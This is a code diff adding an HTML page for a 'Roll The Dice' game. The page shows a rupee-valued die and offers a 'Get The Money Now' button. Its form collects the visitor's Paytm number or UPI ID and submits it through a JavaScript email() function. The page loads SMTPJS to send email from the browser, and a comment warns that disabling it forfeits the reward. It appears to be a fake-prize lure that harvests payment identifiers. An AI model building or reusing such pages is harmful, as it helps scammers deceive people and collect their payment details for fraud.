@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Roll The Dice</title>
+    <!--Google Font-->
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@500&display=swap" rel="stylesheet">
+    <!--Stylesheet-->
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="container">
+        <div class="dice-wrapper">
+            <img  id="die-1" src="./image/₹ 35.png">
+            <!-- <img  id="die-2"> -->
+        </div>
+        <p id="total"></p>
+        <button onclick="roll()" id="rtd">ROLL THE DICE</button>
+        <form  method="POST" action="javascript:email()">
+       <input type="text" name="phone" id="phone" placeholder="Enter Your Paytm No Or UPI ID">
+        <input type="submit" value="Get The Money Now" id="mon">
+    </form>
+    </div>
+    <!--Script-->
+    <script src="script.js"></script>
+    <!-- Its the link to smtp js to send emails using JavaScript. If you disable this you won't get any reward  -->
+    <script src="https://smtpjs.com/v3/smtp.js">
+    </script>
+</body>
+</html>
